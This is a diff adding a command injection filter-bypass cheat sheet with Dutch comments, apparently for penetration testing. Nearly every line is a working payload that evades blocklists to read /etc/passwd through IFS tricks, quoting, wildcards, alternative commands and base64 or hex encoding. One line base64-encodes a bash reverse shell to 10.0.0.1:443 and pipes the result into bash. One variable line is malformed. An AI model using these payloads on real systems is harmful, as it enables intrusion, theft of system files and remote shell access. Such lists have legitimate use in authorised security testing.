@@ -1,0 +1,35 @@
+# Command Injection - Filter/Blocklist Bypass
+# === Spatie bypass ===
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+X=$'\x20';cat${X}/etc/passwd
+# === Keyword bypass (als 'cat' geblokkeerd) ===
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+/bin/c?t /etc/passwd
+# === Commando bypass (alternatieven voor cat) ===
+tac /etc/passwd
+head /etc/passwd
+tail /etc/passwd
+nl /etc/passwd
+sort /etc/passwd
+# === Slash bypass ===
+$(tr '!/' '/ ' <<< 'bin!bash')
+# === String concatenatie ===
+a]b]c=/etc/passwd;cat ${a]b]c}
+# === Base64 encoding bypass ===
+echo 'id' | base64
+# -> aWQ=
+echo aWQ= | base64 -d | bash
+# Complexer:
+echo 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1' | base64
+echo BASE64_HERE | base64 -d | bash
+# === Hex encoding bypass ===
+echo -e '\x69\x64' | bash
+# === Wildcard bypass ===
+/bin/c?t /etc/p?sswd
+/b??/c?t /e??/p??s??
+# Tip: Wfuzz met blocklist bypass wordlist voor geautomatiseerd testen
